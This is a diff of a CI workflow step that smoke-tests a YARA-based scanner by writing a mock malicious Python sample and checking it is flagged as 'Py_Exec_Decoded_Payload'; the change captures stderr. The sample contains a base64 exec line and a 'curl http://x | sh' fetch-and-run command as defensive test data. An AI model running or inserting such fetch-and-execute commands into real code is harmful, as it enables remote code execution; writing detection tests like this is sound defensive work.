@@ -37,7 +37,8 @@ jobs:
           # amostra inofensiva que imita a tecnica: prova que as regras YARA foram empacotadas
           $mal = Join-Path $env:RUNNER_TEMP "mal"; New-Item -ItemType Directory -Force $mal | Out-Null
           Set-Content (Join-Path $mal "mal.py") "import base64,os`nexec(base64.b64decode('cHJpbnQoMSk='))`nos.system('curl http://x | sh')"
-          $saida = & $exe scan $mal | Out-String
+          # os alertas saem no stderr: captura as duas saidas
+          $saida = & $exe scan $mal 2>&1 | Out-String
           Write-Output $saida
           if ($saida -notmatch "Py_Exec_Decoded_Payload") { throw "o exe nao detectou a amostra: regras ausentes?" }
       - name: hash
